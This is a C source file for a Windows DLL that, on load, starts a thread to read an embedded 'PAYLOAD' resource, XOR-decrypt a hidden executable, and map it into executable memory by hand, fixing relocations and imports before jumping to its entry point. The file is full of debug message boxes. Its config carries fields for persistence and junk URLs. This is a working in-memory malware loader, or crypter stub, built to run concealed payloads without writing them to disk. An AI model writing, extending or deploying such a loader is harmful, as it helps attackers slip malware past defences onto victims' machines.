#include <windows.h>
#include <stdio.h>
#include <stdint.h>

void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        sscanf(hex + 2 * i, "%2hhx", &bytes[i]);
    }
}

void apply_relocations(unsigned char *imageBase, PIMAGE_NT_HEADERS ntHeader, DWORD64 delta) {
    PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(imageBase + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0) {
        printf("No relocations needed.\n");
        MessageBoxA(NULL, "Debug: No relocations needed", "DLL Debug", MB_OK | MB_ICONINFORMATION);
        return;
    }
    printf("Applying relocations with delta 0x%llx...\n", delta);
    MessageBoxA(NULL, "Debug: Applying relocations", "DLL Debug", MB_OK | MB_ICONINFORMATION);
    while (relocation->VirtualAddress) {
        DWORD numRelocs = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *relocData = (WORD *)(relocation + 1);
        for (DWORD i = 0; i < numRelocs; i++) {
            int type = relocData[i] >> 12;
            int offset = relocData[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                DWORD64 *address = (DWORD64 *)(imageBase + relocation->VirtualAddress + offset);
                *address += delta;
            }
        }
        relocation = (PIMAGE_BASE_RELOCATION)((BYTE *)relocation + relocation->SizeOfBlock);
    }
    printf("Relocations applied successfully.\n");
    MessageBoxA(NULL, "Debug: Relocations applied successfully", "DLL Debug", MB_OK | MB_ICONINFORMATION);
}

void resolve_imports(unsigned char *imageBase, PIMAGE_NT_HEADERS ntHeader) {
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0) {
        printf("No imports to resolve.\n");
        MessageBoxA(NULL, "Debug: No imports to resolve", "DLL Debug", MB_OK | MB_ICONINFORMATION);
        return;
    }
    printf("Resolving imports...\n");
    MessageBoxA(NULL, "Debug: Resolving imports", "DLL Debug", MB_OK | MB_ICONINFORMATION);
    while (importDesc->Name) {
        LPCSTR dllName = (LPCSTR)(imageBase + importDesc->Name);
        HMODULE hDll = LoadLibraryA(dllName);
        if (!hDll) {
            printf("Error: LoadLibraryA failed for %s: %d\n", dllName, GetLastError());
            MessageBoxA(NULL, "Error: LoadLibraryA failed for DLL", "DLL Debug", MB_OK | MB_ICONERROR);
            return;
        }
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(imageBase + importDesc->FirstThunk);
        while (thunk->u1.AddressOfData) {
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                thunk->u1.Function = (ULONGLONG)GetProcAddress(hDll, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
            } else {
                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(imageBase + thunk->u1.AddressOfData);
                thunk->u1.Function = (ULONGLONG)GetProcAddress(hDll, importByName->Name);
            }
            if (!thunk->u1.Function) {
                printf("Error: GetProcAddress failed: %d\n", GetLastError());
                MessageBoxA(NULL, "Error: GetProcAddress failed", "DLL Debug", MB_OK | MB_ICONERROR);
                return;
            }
            thunk++;
        }
        importDesc++;
    }
    printf("Imports resolved successfully.\n");
    MessageBoxA(NULL, "Debug: Imports resolved successfully", "DLL Debug", MB_OK | MB_ICONINFORMATION);
}

HMODULE g_hModule = NULL;

DWORD WINAPI ExecutePayloadThread(LPVOID lpParam) {
    printf("Starting payload execution thread...\n");
    MessageBoxA(NULL, "Debug: Payload thread started in DLL", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    // Load the embedded PayloadConfig resource
    printf("Attempting to find resource CONFIG of type PAYLOAD...\n");
    MessageBoxA(NULL, "Debug: Finding PayloadConfig resource", "DLL Debug", MB_OK | MB_ICONINFORMATION);
    HRSRC hRes = FindResource(g_hModule, "CONFIG", "PAYLOAD");
    if (!hRes) {
        char errorMsg[256];
        snprintf(errorMsg, sizeof(errorMsg), "Error: FindResource failed: %d", GetLastError());
        printf("%s\n", errorMsg);
        MessageBoxA(NULL, errorMsg, "DLL Debug", MB_OK | MB_ICONERROR);
        return 1;
    }
    printf("Resource found, handle: 0x%p\n", hRes);
    MessageBoxA(NULL, "Debug: PayloadConfig resource found", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    HGLOBAL hGlobal = LoadResource(g_hModule, hRes);
    if (!hGlobal) {
        char errorMsg[256];
        snprintf(errorMsg, sizeof(errorMsg), "Error: LoadResource failed: %d", GetLastError());
        printf("%s\n", errorMsg);
        MessageBoxA(NULL, errorMsg, "DLL Debug", MB_OK | MB_ICONERROR);
        return 1;
    }
    printf("Resource loaded successfully.\n");
    MessageBoxA(NULL, "Debug: PayloadConfig resource loaded", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    void *config_data = LockResource(hGlobal);
    if (!config_data) {
        printf("Error: LockResource failed\n");
        MessageBoxA(NULL, "Error: LockResource failed", "DLL Debug", MB_OK | MB_ICONERROR);
        return 1;
    }
    printf("Resource locked successfully.\n");
    MessageBoxA(NULL, "Debug: PayloadConfig resource locked", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    DWORD config_size = SizeofResource(g_hModule, hRes);
    if (config_size == 0) {
        char errorMsg[256];
        snprintf(errorMsg, sizeof(errorMsg), "Error: SizeofResource failed: %d", GetLastError());
        printf("%s\n", errorMsg);
        MessageBoxA(NULL, errorMsg, "DLL Debug", MB_OK | MB_ICONERROR);
        return 1;
    }
    printf("PayloadConfig resource loaded successfully, size: %u bytes\n", config_size);
    MessageBoxA(NULL, "Debug: PayloadConfig size retrieved", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    // Parse the PayloadConfig structure
    typedef struct {
        char key_hex[65];           // 64 chars + null terminator
        unsigned char persistence;  // 1 byte
        uint32_t junk_url_count;    // 4 bytes
        uint64_t payload_size;      // 8 bytes
        unsigned char load_in_memory; // 1 byte
        unsigned char payload_data[1]; // Variable length
    } PayloadConfig;
    PayloadConfig *config = (PayloadConfig *)config_data;
    char *key_hex = config->key_hex;
    uint64_t payload_size = config->payload_size;
    unsigned char *encrypted_payload = config->payload_data;

    printf("Parsed config: persistence=%d, junk_url_count=%u, payload_size=%llu, load_in_memory=%d\n",
           config->persistence, config->junk_url_count, payload_size, config->load_in_memory);
    MessageBoxA(NULL, "Debug: PayloadConfig parsed", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    // Convert key_hex to bytes
    printf("Converting key_hex to bytes...\n");
    MessageBoxA(NULL, "Debug: Converting key_hex to bytes", "DLL Debug", MB_OK | MB_ICONINFORMATION);
    unsigned char key[32];
    hex_to_bytes(key_hex, key, 32);
    printf("Key converted successfully.\n");
    MessageBoxA(NULL, "Debug: Key converted successfully", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    // Decrypt the payload
    printf("Decrypting payload (size: %llu bytes)...\n", payload_size);
    MessageBoxA(NULL, "Debug: Decrypting payload", "DLL Debug", MB_OK | MB_ICONINFORMATION);
    unsigned char *decrypted_payload = malloc(payload_size);
    if (!decrypted_payload) {
        printf("Error: Could not allocate memory for decrypted payload.\n");
        MessageBoxA(NULL, "Error: Could not allocate memory for decrypted payload", "DLL Debug", MB_OK | MB_ICONERROR);
        return 1;
    }
    memcpy(decrypted_payload, encrypted_payload, payload_size);
    for (uint64_t i = 0; i < payload_size; i++) {
        decrypted_payload[i] ^= key[i % 32];
    }
    printf("Payload decrypted successfully.\n");
    MessageBoxA(NULL, "Debug: Payload decrypted successfully", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    // Allocate memory for the EXE image
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)decrypted_payload;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Error: Invalid DOS signature in EXE.\n");
        MessageBoxA(NULL, "Error: Invalid DOS signature", "DLL Debug", MB_OK | MB_ICONERROR);
        free(decrypted_payload);
        return 1;
    }
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE *)decrypted_payload + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        printf("Error: Invalid NT signature in EXE.\n");
        MessageBoxA(NULL, "Error: Invalid NT signature", "DLL Debug", MB_OK | MB_ICONERROR);
        free(decrypted_payload);
        return 1;
    }
    SIZE_T image_size = ntHeader->OptionalHeader.SizeOfImage;
    printf("Image size: %zu bytes, preferred base: 0x%llx\n", image_size, ntHeader->OptionalHeader.ImageBase);
    MessageBoxA(NULL, "Debug: EXE image validated", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    LPVOID imageBase = VirtualAlloc(NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!imageBase) {
        char errorMsg[256];
        snprintf(errorMsg, sizeof(errorMsg), "Error: VirtualAlloc failed: %d", GetLastError());
        printf("%s\n", errorMsg);
        MessageBoxA(NULL, errorMsg, "DLL Debug", MB_OK | MB_ICONERROR);
        free(decrypted_payload);
        return 1;
    }
    printf("Allocated memory at 0x%p\n", imageBase);
    MessageBoxA(NULL, "Debug: Memory allocated for EXE image", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    // Copy headers
    memcpy(imageBase, decrypted_payload, ntHeader->OptionalHeader.SizeOfHeaders);
    printf("Copied PE headers.\n");
    MessageBoxA(NULL, "Debug: Copied PE headers", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    // Copy sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);
    for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData) {
            memcpy((BYTE *)imageBase + section[i].VirtualAddress, (BYTE *)decrypted_payload + section[i].PointerToRawData, section[i].SizeOfRawData);
            printf("Copied section %d (RVA 0x%lx, size %zu)\n", i, section[i].VirtualAddress, section[i].SizeOfRawData);
        }
    }
    printf("All sections copied successfully.\n");
    MessageBoxA(NULL, "Debug: All sections copied", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    // Apply relocations
    DWORD64 delta = (DWORD64)imageBase - ntHeader->OptionalHeader.ImageBase;
    if (delta != 0) {
        apply_relocations((unsigned char *)imageBase, ntHeader, delta);
    } else {
        printf("No relocation needed (allocated at preferred base).\n");
        MessageBoxA(NULL, "Debug: No relocation needed", "DLL Debug", MB_OK | MB_ICONINFORMATION);
    }

    // Resolve imports
    resolve_imports((unsigned char *)imageBase, ntHeader);

    // Execute the payload
    printf("Executing payload at entry point 0x%p...\n", (LPVOID)((DWORD64)imageBase + ntHeader->OptionalHeader.AddressOfEntryPoint));
    MessageBoxA(NULL, "Debug: Executing payload", "DLL Debug", MB_OK | MB_ICONINFORMATION);
    typedef int (WINAPI *WinMain_t)(HINSTANCE, HINSTANCE, LPSTR, int);
    WinMain_t entryPoint = (WinMain_t)((DWORD64)imageBase + ntHeader->OptionalHeader.AddressOfEntryPoint);
    int result = entryPoint(NULL, NULL, NULL, 10); // SW_SHOW
    printf("Payload execution completed with result: %d\n", result);
    MessageBoxA(NULL, "Debug: Payload execution completed", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    // Clean up
    VirtualFree(imageBase, 0, MEM_RELEASE);
    free(decrypted_payload);
    printf("Cleaned up allocated memory.\n");
    MessageBoxA(NULL, "Debug: Cleaned up allocated memory", "DLL Debug", MB_OK | MB_ICONINFORMATION);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            g_hModule = hModule; // Store the module handle for resource loading
            printf("DLL loaded into process. Module handle: 0x%p\n", hModule);
            MessageBoxA(NULL, "Debug: DLL loaded into process", "DLL Debug", MB_OK | MB_ICONINFORMATION);
            CreateThread(NULL, 0, ExecutePayloadThread, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            printf("DLL unloaded from process.\n");
            MessageBoxA(NULL, "Debug: DLL unloaded from process", "DLL Debug", MB_OK | MB_ICONINFORMATION);
            break;
    }
    return TRUE;
}